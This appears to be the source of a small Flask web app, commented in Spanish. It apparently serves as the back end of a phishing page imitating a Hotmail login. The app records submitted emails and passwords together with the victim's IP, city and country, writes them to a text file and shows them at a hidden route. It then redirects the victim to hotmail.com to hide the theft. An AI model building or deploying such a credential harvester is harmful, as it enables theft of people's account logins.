from flask import Flask, render_template, request, redirect, url_for
import requests
import schedule
import time

app = Flask(__name__)

def make_request():
    # Hacer un request al servidor cada 30 segundos
    requests.get('http://127.0.0.1:5000/ver_txt')

# Programar el request automático cada 30 segundos
schedule.every(30).seconds.do(make_request)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Obtener los datos del formulario
    input1 = request.form['input1']
    input2 = request.form['input2']
    ip = request.form['ip']
    ciudad =request.form['ciudad']
    pais = request.form['pais']
    # Obtener la IP del usuario

    # Escribir los datos en un archivo de texto junto con la IP
    with open('data.txt', 'a') as file:
        file.write(f'IP: {ip} Ciudad: {ciudad} Pais: {pais},  Correo: {input1}, Contra: {input2}\n')

    # Redirigir a otra página
    return redirect(url_for('success'))

@app.route('/lozada01')
def ver_txt():
    # Leer el contenido del archivo de texto
    with open('data.txt', 'r') as file:
        contenido = file.read()

    # Mostrar el contenido en una página web
    return f'<pre>{contenido}</pre>'

@app.route('/success')
def success():
    return redirect('https://hotmail.com')

if __name__ == '__main__':
    app.run(debug=True)

    while True:
        schedule.run_pending()
        time.sleep(1)
